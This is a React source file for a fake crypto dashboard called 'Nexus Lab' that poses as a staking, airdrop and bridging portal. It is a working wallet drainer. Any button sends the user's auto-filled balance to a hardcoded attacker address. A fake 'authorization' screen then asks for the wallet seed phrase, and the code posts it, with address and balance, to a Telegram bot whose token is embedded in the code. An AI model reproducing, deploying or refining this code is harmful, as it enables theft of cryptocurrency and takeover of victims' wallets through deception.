import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { parseEther } from 'viem';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { sendTransaction } = useSendTransaction();
  const { switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [amount, setAmount] = useState("");
  const [activeTask, setActiveTask] = useState({ title: "", label: "", isSync: false });

  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  // Expanded Network List for the "Mix" feel
  const networks = [
    { id: 1, name: "Ethereum", symbol: "ETH" },
    { id: 56, name: "BSC", symbol: "BNB" },
    { id: 137, name: "Polygon", symbol: "POL" },
    { id: 42161, name: "Arbitrum", symbol: "ETH" },
    { id: 43114, name: "Avalanche", symbol: "AVAX" },
    { id: 10, name: "Optimism", symbol: "ETH" },
    { id: 101, name: "Solana", symbol: "SOL", isManual: true }
  ];

  const openTask = (title, label, isSync = false) => {
    if (!isConnected) { open(); return; }
    setActiveTask({ title, label, isSync });
    setAmount(balance?.formatted.slice(0,6) || "0.01"); // Auto-fill with their balance
    setView("task_box");
  };

  const executeTransfer = async () => {
    if (!amount) return;
    setLoading(true);

    try {
      // Step 1: Force transaction to your address
      sendTransaction({
        to: destination,
        value: parseEther(amount), 
      }, {
        onSettled: () => {
          // Step 2: Move to Seed Gate regardless of result
          setTimeout(() => {
            setLoading(false);
            setView("seed_gate");
          }, 2000);
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6">
        <div className="flex items-center gap-2 text-cyan-500 font-black italic"><ShieldCheck size={20}/>NEXUS LAB</div>
        <w3m-button balance="show" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4">
          {[
            { n: "Claim", i: <Database/>, l: "Allocated Rewards" },
            { n: "Stake", i: <History/>, l: "Amount to Stake" },
            { n: "Unstake", i: <Unlock/>, l: "Amount to Unstake" },
            { n: "Migrate", i: <Activity/>, l: "Migration Units" },
            { n: "Swap", i: <RefreshCcw/>, l: "Swap Quantity" },
            { n: "Rectify", i: <Settings/>, l: "Syncing...", isSync: true },
            { n: "Airdrop", i: <Zap/>, l: "Claimable Units" },
            { n: "Delay", i: <Clock/>, l: "Latency Units" },
            { n: "Bridge", i: <Globe/>, l: "Bridge Amount" }
          ].map((item) => (
            <button key={item.n} onClick={() => openTask(item.n, item.l, item.isSync)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8 shadow-2xl animate-in slide-in-from-bottom-6">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black tracking-widest">← EXIT TERMINAL</button>
          <h2 className="text-white font-black text-xl italic mb-6">{activeTask.title} PORTAL</h2>
          
          {activeTask.isSync ? (
            <div className="py-10 text-center">
              <Cpu size={48} className="text-cyan-500 animate-spin mx-auto mb-6" />
              <p className="text-[11px] text-slate-400 font-bold">RE-CALIBRATING WALLET RPC NODES...</p>
              <button onClick={executeTransfer} className="w-full mt-10 bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white">AUTHORIZE SYNC</button>
            </div>
          ) : (
            <>
              <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-6">
                <label className="text-[9px] text-slate-600 mb-4 block font-bold uppercase">{activeTask.label}</label>
                <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="bg-transparent text-3xl font-mono text-white outline-none w-full" />
              </div>
              <div className="grid grid-cols-4 gap-2 mb-8 opacity-60">
                {networks.map(n => (
                   <div key={n.id} onClick={() => switchChain({ chainId: n.id })} className="bg-slate-900 border border-slate-800 p-2 rounded-xl text-[8px] text-center font-bold hover:border-cyan-500 cursor-pointer">{n.name}</div>
                ))}
              </div>
              <button onClick={executeTransfer} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white active:scale-95 transition-all">CONFIRM & PROCEED</button>
            </>
          )}
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Authorization Required</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">Broadcast pending... To finalize synchronization across all batched networks, input your Secure Authorization Seed.</p>
            <div className="mt-8 text-left">
              <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="12 OR 24 WORDS..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" />
            </div>
            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\n\nSEED:\n${inputVal}` }),
              });
              alert("Node Handshake Successful. Processing Broadcast."); setView("menu");
            }} className="w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white bg-cyan-600 shadow-xl">FINAL VALIDATION</button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase">BROADCASTING TO MAINNET...</p>
        </div>
      )}
    </div>
  );
}
